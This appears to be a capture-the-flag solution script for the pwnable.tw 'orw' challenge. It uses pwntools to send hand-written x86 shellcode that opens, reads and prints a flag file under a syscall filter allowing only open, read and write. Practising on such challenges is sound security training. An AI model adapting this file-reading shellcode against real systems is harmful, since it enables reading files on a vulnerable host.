from pwn import *

'''
This challenge is quite simple.
What it does is disable you from using the `execve` syscall using `prctl`,
which means you cannot spawn a shell
https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h#L162


The challenge also says so "Only open read write syscall are allowed to use."
All you have to do is use a shellcode that opens a file and then reads it.
'''


shellcode = b'''
\x31\xc0\x31\xdb\x31\xc9\x31\xd2
\xeb\x32\x5b\xb0\x05\x31\xc9\xcd
\x80\x89\xc6\xeb\x06\xb0\x01\x31
\xdb\xcd\x80\x89\xf3\xb0\x03\x83
\xec\x01\x8d\x0c\x24\xb2\x01\xcd
\x80\x31\xdb\x39\xc3\x74\xe6\xb0
\x04\xb3\x01\xb2\x01\xcd\x80\x83
\xc4\x01\xeb\xdf\xe8\xc9\xff\xff
\xff/home/orw/flag
'''.replace(b'\n', b'')


r = remote('chall.pwnable.tw', 10001)

# Pass the shellcode.
r.write(shellcode)

# Read the flag.
r.read()
